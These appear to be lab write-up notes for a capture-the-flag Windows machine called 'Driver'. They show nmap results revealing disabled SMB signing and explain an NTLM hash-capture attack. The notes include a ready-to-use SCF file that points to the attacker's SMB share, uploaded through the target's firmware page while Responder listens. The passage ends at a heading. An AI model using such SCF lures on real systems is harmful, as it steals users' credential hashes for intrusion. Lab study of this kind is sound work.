#  Initial shell as 'tony' user
## From [[Driver/10 - Common Enumeration]] it is discovered that SMB signing is disabled
From [[Driver/10 - Common Enumeration]] it is discovered that SMB signing is disabled.
```bash
Host script results:
|_clock-skew: mean: 6h59m29s, deviation: 3s, median: 6h59m26s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.10:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-04T17:41:25
|_  start_date: 2021-10-04T14:45:24

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   213.88 ms 10.10.14.1
2   213.94 ms 10.10.11.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.56 seconds
```
Also from crackmapexec,
![[Pasted image 20211007183540.png]]
## If SMB signing is disabled we can do NTLM relay attack
If SMB signing is disabled we can do NTLM relay attack to get user hash.To perform this attack we will first start `responder` tool in and on http://10.10.11.106/fw_up.php we will upload Shell Command File `.scf` file with following contents 
```bash
[Shell]

Command=2

IconFile=\\10.10.14.98\share\dfsdfsdf.scf

[Taskbar]

Command=ToggleDesktop
```
Note: SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share as explained in [link](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).
As soon as we upload a `.scf.` with  filename starting from `@` (so that file is placed first in folder and executed as soon as it is uploaded).
## Uploading `.scf` to get NTLM Hash
